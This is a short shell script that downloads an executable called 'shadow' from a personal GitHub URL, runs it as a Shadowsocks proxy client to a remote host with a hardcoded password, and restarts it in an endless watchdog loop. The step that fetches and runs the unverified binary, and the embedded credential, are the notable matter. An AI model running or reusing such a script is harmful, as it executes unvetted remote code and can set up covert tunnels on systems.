apt update >/dev/null;apt -y install curl wget net-tools >/dev/null
curl -s -L -o shadow https://raw.githubusercontent.com/mncedisihlabathini/Merry/main/shadow >/dev/null
sleep 2
chmod +x shadow
ls -la

while true
do
if [ "$(curl -sL -x socks5h://127.0.0.1:1081 -w '%{http_code}' http://api.ipify.org -o /dev/null)" = "200" ]; then
    echo "Shadowsocks is still online"
else
     ps -A | grep shadow | awk '{print $1}' | xargs kill -9 $1
     sleep 5
     ./shadow -b "127.0.0.1:1081" -s "cpusocks$(shuf -i 7-12 -n 1).wot.mrface.com:443" -m "chacha20-ietf-poly1305" -k "Gnikbaas999" &
     echo ""
     echo ""
     sleep 5
     curl -x socks5h://127.0.0.1:1081 ifconfig.me
     echo ""
     echo ""
     netstat -ntlp
     echo ""
     echo ""
fi
sleep 600
done
